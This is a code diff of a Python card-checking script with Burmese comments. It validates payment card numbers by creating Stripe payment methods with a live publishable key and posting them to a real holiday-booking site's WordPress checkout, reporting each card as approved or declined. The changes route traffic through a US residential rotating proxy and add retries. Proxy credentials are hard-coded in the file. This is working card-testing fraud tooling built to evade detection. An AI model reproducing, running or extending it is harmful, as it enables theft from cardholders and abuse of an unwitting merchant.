@@ -1,15 +1,17 @@
 import requests, re
 import random
 import string
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 # ==========================================
-# 👇 PROXY SETTINGS (Singapore Region + New Session + 60s Timeout)
+# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
 # ==========================================
 PROXY_HOST = 'geo.g-w.info'
 PROXY_PORT = '10080'
 
-# 🔥 Session ကို 'FinalAuto01' လို့ ပြောင်းထားတယ် (IP အသစ်ရဖို့)
-PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-FinalAuto01-country-SG-rotation-15'
+# 🔥 မင်းထုတ်လာတဲ့ US Proxy (Virginia Beach) ကို ထည့်လိုက်ပြီ
+PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-xg0gkepv-country-US-city-Virginia_Beach-rotation-15'
 
 PROXY_PASS = 'EJJT0uWaSUv4yUXJ'
 # ==========================================
@@ -32,10 +34,18 @@ def Tele(ccx):
         if "20" in yy:
             yy = yy.split("20")[1]
 
-        # 🔥 Random Email Logic
         letters = string.ascii_lowercase + string.digits
         random_name = ''.join(random.choice(letters) for i in range(10))
         random_email = f"{random_name}@gmail.com"
+
+        # 🔥 RETRY SYSTEM (အရေးကြီးဆုံး အပိုင်း) 🔥
+        # Proxy တခါချိတ်မရရင် ၃ ခါအထိ ပြန်စမ်းမယ် (Slow Proxy Error ပျောက်အောင်)
+        session = requests.Session()
+        retry = Retry(connect=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        session.proxies = proxies
 
         # ==========================================
         # Step 1: Create Payment Method (Stripe)
@@ -43,7 +53,6 @@ def Tele(ccx):
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
@@ -58,16 +67,16 @@ def Tele(ccx):
             f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
         )
 
-        response = requests.post(
+        # session.post ကိုသုံးထားတယ် (Retry အလုပ်လုပ်အောင်)
+        response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=headers,
             data=data,
-            proxies=proxies, # 🔥 Proxy Active
-            timeout=60 # 🔥 Timeout 60s (Handshake error ပျောက်အောင်)
+            timeout=40 
         )
 
         if 'id' not in response.json():
-            return "Proxy Error or Invalid Card ❌"
+            return "Proxy Error (PM Failed) ❌"
             
         pm = response.json()['id']
 
@@ -95,12 +104,11 @@ def Tele(ccx):
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
-        response = requests.post(
+        response = session.post(
             'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
-            proxies=proxies, # 🔥 Proxy Active
-            timeout=60 # 🔥 Timeout 60s
+            timeout=40
         )
         
         try:
@@ -112,7 +120,7 @@ def Tele(ccx):
                 result = "Decline⛔"
 
     except Exception as e:
-        # Error တက်ခဲ့ရင်တောင် Bot မရပ်သွားအောင် Skip message ပြမယ်
-        result = f"Slow Proxy (Skipped) ⚠️"
+        # ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
+        result = f"Connection Failed (Retry Limit) ⚠️"
         
     return result
